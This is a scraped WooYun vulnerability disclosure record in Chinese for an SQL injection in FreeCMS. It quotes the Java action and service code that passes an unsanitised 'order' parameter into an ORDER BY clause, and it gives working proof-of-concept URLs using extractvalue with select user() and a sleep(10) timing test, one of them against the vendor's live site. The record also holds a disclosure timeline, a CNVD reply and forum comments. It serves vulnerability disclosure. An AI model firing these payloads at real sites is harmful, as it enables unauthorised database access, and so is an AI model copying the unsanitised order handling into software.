{"id": 1350, "wybug_id": "wooyun-2014-065422", "wybug_title": "FreeCms通杀SQL注射漏洞", "wybug_corp": "FreeCms.com", "wybug_author": "Chora", "wybug_date": "2014-06-19 12:08", "wybug_open_date": "2014-09-17 12:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向公众公开  简要描述： 公司最近javaee有业务只有提起手枪公关了，深得园长天天炫斗真传。 详细说明：  order注射不只这一处，用到order的基本都存在比如CommentAction里也是类似的注入点,这里就只写一处啦。免费版跟商业版都存在，只是商业版没有_list后缀，官方关闭了调试盲注。0x00\npackage cn.freeteam.cms.action.member;import java.util.List;import cn.freeteam.base.BaseAction;import cn.freeteam.cms.model.Comment;import cn.freeteam.cms.model.Creditlog;import cn.freeteam.cms.model.Creditrule;import cn.freeteam.cms.service.CreditlogService;import cn.freeteam.cms.service.CreditruleService;import cn.freeteam.model.OperlogsExample;import cn.freeteam.model.OperlogsExample.Criteria;import cn.freeteam.util.Pager;/** *  * <p>Title: CreditlogAction.java</p> *  * <p>Description:积分记录相关操作 </p> *  * <p>Date: Feb 4, 2013</p> *  * <p>Time: 7:52:23 PM</p> *  * <p>Copyright: 2013</p> *  * <p>Company: freeteam</p> *  * @author freeteam * @version 1.0 *  * <p>============================================</p> * <p>Modification History * <p>Mender: </p> * <p>Date: </p> * <p>Reason: </p> * <p>============================================</p> */public class CreditlogAction extends BaseAction{\t\tprivate Creditlog creditlog;\tprivate CreditlogService creditlogService;\tprivate CreditruleService creditruleService;\tprivate List<Creditlog> creditlogList;\tprivate List<Creditrule> creditruleList;\tprivate String order=\"credittime desc\";\t\tpublic CreditlogAction() {\t\tinit(\"creditlogService\",\"creditruleService\");\t}\t/**\t * 列表\t * @return\t */\tpublic String list(){\t\tif (creditlog==null ){\t\t\tcreditlog=new Creditlog();\t\t}\t\tif (order.trim().length()==0) {//只是单单的判断了order不为空，并没有做任何处理。\t\t\torder=\" credittime desc \";\t\t}\t\tcreditlog.setMemberid(getLoginMember().getId());\t\tcreditruleList=creditruleService.find(null, \"ordernum\", true);//跟进0x01\t\tcreditlogList=creditlogService.find(creditlog, order, currPage, pageSize);\t\ttotalCount=creditlogService.count(creditlog);\t\tPager pager=new Pager(getHttpRequest());\t\tpager.appendParam(\"creditlog.creditruleid\");\t\tpager.appendParam(\"creditlog.type\");\t\tpager.appendParam(\"pageSize\");\t\tpager.appendParam(\"pageFuncId\");\t\tpager.setCurrPage(currPage);\t\tpager.appendParam(\"order\");\t\tpager.setPageSize(pageSize);\t\tpager.setTotalCount(totalCount);\t\tpager.setOutStrNoTable(\"creditlog_list.do\");\t\tpageStr=pager.getOutStrNoTable();\t\treturn \"list\";\t}...\n0x01\npublic List<Creditlog> find(Creditlog Creditlog,String order,int currPage,int pageSize){\t\tCreditlogExample example=new CreditlogExample();\t\tCriteria criteria=example.createCriteria();\t\tproSearchParam(Creditlog, criteria);\t\tif (order!=null && order.trim().length()>0) {\t\t\texample.setOrderByClause(order);//这里引入\t\t}\t\texample.setCurrPage(currPage);\t\texample.setPageSize(pageSize);\t\treturn creditlogMapper.selectPageByExample(example);//这里带入查询\t}\n先注册一个用户http://localhost:8080/JAVAEE/register.jsp然后访问http://localhost:8080/JAVAEE/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select user()),0x7C))官方关闭了调试，用sleep测试了下却是存在，只是映射的名称少了_listhttp://www.freeteam.cn/member/creditlog.do?order=sleep(10)   漏洞证明：  \n\n\n\n   修复方案：  你们是专业的，我是来打酱油的。   版权声明：转载请注明来源 Chora@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-06-23 22:30 厂商回复： CNVD确认所述漏洞原理分析，并进行实例复现有多个政府网站受影响，已经由CNVD直接联系软件生产厂商处置，电话至***，将通报发送至freeteam 邮箱中处置 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-19 12:35 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  nb    \n     2014-06-19 16:14 |    \t\t传说online \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:17        | hack.com)\t\t \n  哇。好厉害。。    \n     2014-06-19 16:15 |    \t\tPhale \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 就是要一直走下去。)\t\t \n  大牛，求带    \n     2014-06-26 11:03 |    \t\t小学生 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:1        | 我是小学生)\t\t \n  我擦，我TM不在线你就黑我。    \n     2014-09-20 21:26 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  MAKE    \n     2015-08-12 16:53 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}